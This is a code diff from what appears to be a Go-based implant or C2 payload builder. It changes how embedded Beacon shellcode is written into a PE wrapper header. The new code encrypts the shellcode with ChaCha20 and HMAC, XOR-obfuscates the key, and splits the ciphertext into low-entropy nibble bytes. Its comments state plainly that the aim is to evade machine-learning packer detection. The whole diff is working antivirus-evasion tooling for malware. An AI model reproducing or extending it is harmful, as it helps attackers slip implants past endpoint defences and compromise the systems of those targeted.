@@ -249,28 +249,57 @@ func generateSleepmaskH(bofBytes []byte) []byte {
 
 /* ========= [ PE wrapper compilation ] ========= */
 
-func generateShellcodeH(blob []byte) []byte {
+/* Beacon-at-rest encryption: the wrapper embeds the blob ENCRYPTED
+ * (ChaCha20+HMAC, pe_templates/Decrypt.h decrypts it at run time).
+ * Fresh random key/nonce per build; key XOR-obfuscated. */
+func generateShellcodeH(plain []byte) ([]byte, error) {
+	blob := make([]byte, len(plain))
+	copy(blob, plain) // don't mutate the caller's slice
+	enc, err := EncryptShellcode(blob)
+	if err != nil {
+		return nil, fmt.Errorf("shellcode encrypt: %w", err)
+	}
+
 	var buf bytes.Buffer
 	buf.WriteString("#pragma once\n\n")
 	buf.WriteString("namespace Shellcode {\n")
-	buf.WriteString("    __attribute__((used, section(\".text\")))\n")
-	buf.WriteString("    unsigned char Data[] = {\n")
 
-	for i, b := range blob {
-		if i%16 == 0 {
-			buf.WriteString("        ")
+	arr := func(name string, data []byte) {
+		fmt.Fprintf(&buf, "    static const unsigned char %s[%d] = {\n", name, len(data))
+		for i, b := range data {
+			if i%16 == 0 {
+				buf.WriteString("        ")
+			}
+			fmt.Fprintf(&buf, "0x%02X,", b)
+			if i%16 == 15 || i == len(data)-1 {
+				buf.WriteString("\n")
+			} else {
+				buf.WriteByte(' ')
+			}
 		}
-		fmt.Fprintf(&buf, "0x%02X,", b)
-		if i%16 == 15 || i == len(blob)-1 {
-			buf.WriteString("\n")
-		} else {
-			buf.WriteByte(' ')
-		}
+		buf.WriteString("    };\n")
 	}
 
-	buf.WriteString("    };\n")
+	fmt.Fprintf(&buf, "    static const unsigned char OBF_BYTE = 0x%02x;\n", enc.OBFByte)
+	arr("KEY_OBF", enc.KeyObf[:])
+	arr("NONCE", enc.Nonce[:])
+	arr("MAC", enc.MAC[:])
+
+	/* Store the ciphertext as interleaved nibble bytes (0x40|hi, 0x40|lo).
+	 * A ~97 KB max-entropy blob resident in the PE is the packer ML feature
+	 * that survives even the zero-IAT wrapper; this form measures ~4.0
+	 * Shannon entropy per section and is reconstructed into the RW
+	 * allocation at run time (pe_templates/Decrypt.h).  Plain const arrays
+	 * referenced by ShellRun land in .rdata - no section attribute. */
+	split := make([]byte, 2*len(enc.Data))
+	for i, b := range enc.Data {
+		split[2*i] = 0x40 | b>>4
+		split[2*i+1] = 0x40 | (b & 0x0F)
+	}
+	arr("Data", split)
+
 	buf.WriteString("}\n")
-	return buf.Bytes()
+	return buf.Bytes(), nil
 }
 
 func compileWrapper(pic []byte, format, svcName, dllExport string, debug bool, logFn func(int, string, ...any)) ([]byte, string, error) {
@@ -280,7 +309,11 @@ func compileWrapper(pic []byte, format, svcName, dllExport string, debug bool, l
 	}
 	defer os.RemoveAll(tmpDir)
 
-	if err := os.WriteFile(filepath.Join(tmpDir, "Shellcode.h"), generateShellcodeH(pic), 0644); err != nil {
+	scH, err := generateShellcodeH(pic)
+	if err != nil {
+		return nil, "", err
+	}
+	if err := os.WriteFile(filepath.Join(tmpDir, "Shellcode.h"), scH, 0644); err != nil {
 		return nil, "", fmt.Errorf("write Shellcode.h: %w", err)
 	}
 
